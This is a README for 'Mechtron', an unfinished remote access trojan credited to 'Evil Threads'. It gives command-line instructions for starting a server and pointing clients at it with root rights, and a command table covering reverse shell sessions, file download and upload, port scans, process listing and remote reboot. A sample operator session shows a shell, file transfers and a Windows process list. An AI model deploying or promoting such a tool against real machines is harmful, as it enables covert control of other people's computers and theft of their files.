# Mechtron
This is an unfinished project.

Mechtron is a RAT that gives the server remote access to the client machine. You can execute remote commands on the client machine. The server also has the ability to upload and download files from the client machine. Besides these commands, there are a few sugar commands. Mechtron can handle multiple clients at one time. Mechtron is used to form a network of computers that allows the server to operate on them. You can only work with one computer at a time.

The client software is distributed using the Mechtron application, but by supplying an argument with the server's IP address.

```
sudo ./mechtron -c 127.0.0.1
```

The server is ran using one argument.
```
./mechtron -s
```

Mechtron runs on port 6666. It can handle multiple clients, but one session at a time. Meaning you can have one reverse shell instance at a time. I plan on publishing a debian package, but for now, you'll have to deal with the source folders.

## Useful Tips
- You can aim a Mechtron client at a Mechtron server that doesn't exist yet.
- A torified shell will interfere with Mechtron.
- You can use a client's ID anywhere you can use an IP address and vice versa.
- A client will have a new ID number assigned to it when it reconnects.
- The ID number is to the left of the IP address.
- if you follow the client script name with '&' it will run it in the background.

## Commands
<table>
    <tr>
        <th>Commands</th>
        <th>Description</th>
    </tr>
    <tr>
        <td>clients</td>
        <td>Get a list of the connected machines</td>
    </tr>
    <tr>
        <td nowrap>session IP</td>
        <td>Use session with an IP address to start a reverse shell session. Enter "exit" to stop</td>
    </tr>
    <tr>
        <td nowrap>get IP FILE FORMAT</td>
        <td>Use get with an IP address followed by a file path and a format to download files. The format options are binary and text.</td>
    </tr>
    <tr>
        <td nowrap>put IP FILE FORMAT</td>
        <td>Use put with an IP address followed by a file path and a format to upload files. The format options are binary and text.</td>
    </tr>
    <tr>
        <td nowrap>scan IP</td>
        <td>Scan all TCP ports on the client machine</td>
    </tr>
    <tr>
        <td nowrap>latency IP</td>
        <td>Get the speed of the connection for a client machine in milliseconds.</td>
    </tr>
    <tr>
        <td nowrap>programs IP</td>
        <td>Get a list of the running programs on a client machine.</td>
    </tr>
    <tr>
        <td nowrap>uptime IP</td>
        <td>Returns how long the client has been connected in minutes.</td>
    </tr>
    <tr>
        <td nowrap>reboot IP</td>
        <td>Reboots the client machine.</td>
    </tr>
    <tr>
        <td nowrap>clear</td>
        <td>Clears the screen.</td>
    </tr>
    <tr>
        <td>help</td>
        <td>shows the HELP menu</td>
    </tr>
    <tr>
        <td>exit</td>
        <td>Closes Mechtron application</td>
    </tr>
</table>

## Instructions
  <table>
    <tr>
      <th>Program Parameters</th>
      <th>Description</th>
    </tr>
    <tr>
      <td>-s</td>
      <td>Server mode</td>
    </tr>
    <tr>
      <td>-c IP</td>
      <td>Client mode. This parameter requires an IP address</td>
    </tr>
  </table>

## Example Usage

### Server
```
chmod +x mechtron.rb
./mechtron -s
starting server on port 6666
version 1
Useful tip: You can use the client ID in place of the IP!
  __  __ ______ _____ _    _ _______ _____   ____  _   _ 
 |  \/  |  ____/ ____| |  | |__   __|  __ \ / __ \| \ | |
 | \  / | |__ | |    | |__| |  | |  | |__) | |  | |  \| |
 | |\/| |  __|| |    |  __  |  | |  |  _  /| |  | | . ` |
 | |  | | |___| |____| |  | |  | |  | | \ \| |__| | |\  |
 |_|  |_|______\_____|_|  |_|  |_|  |_|  \_\\____/|_| \_|
By Evil Threads

[0] 127.0.0.1 chrisbasinger Linux joined
session 0
session started with [0] 127.0.0.1 chrisbasinger Linux
$ whoami
chrisbasinger
$ which ruby
/bin/ruby
$ exit
closing session
get 0 /home/chrisbasinger/script.sh text
download finished
get 0 /home/chrisbasinger/picture.jpg binary
download finished
put 0 /home/chrisbasinger/file.txt text
upload finished
put 0 /home/chrisbasinger/spreadsheet.xlsx binary
upload finished
scan 0
111 open
631 open
2049 open
4444 open
scan finished
latency 0
0.00022492 milliseconds
clients
+------------------------------------------+
|                 CLIENTS                  |
+----+------------+----------------+-------+
| ID | IP ADDRESS | NAME           | OS    |
+----+------------+----------------+-------+
| 0  | 127.0.0.1  | gazelle-laptop | Linux |
+----+------------+----------------+-------+
[1] 192.168.1.219 chris Linux joined
programs 1

Image Name                     PID Session Name        Session#    Mem Usage
========================= ======== ================ =========== ============
System Idle Process              0 Services                   0          8 K
System                           4 Services                   0         32 K
Registry                        92 Services                   0     20,628 K
smss.exe                       324 Services                   0        268 K
csrss.exe                      424 Services                   0      2,268 K
wininit.exe                    500 Services                   0        660 K
csrss.exe                      512 Console                    1      2,592 K
winlogon.exe                   596 Console                    1      3,228 K
services.exe                   616 Services                   0      6,212 K

uptime 0
1.7 minutes
exit
exiting the server..

Process finished with exit code 0

```

### Client
```
chmod +x rat.rb
sudo ./mechtron -c 127.0.0.1
```

## License
```
Copyright 2023 Chris Basinger

Licensed under the Apache License, Version 2.0(the "License");
you may not use this file except in compliance with the License.
You may obtain a copy of the License at

http://www.apache.org/licenses/LICENSE-2.0

Unless required by applicable law or agreed to in writing, software
distributed under the License is distributed on an "AS IS" BASIS,
WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
See the License for the specific language governing permissions and
limitations under the License.

```
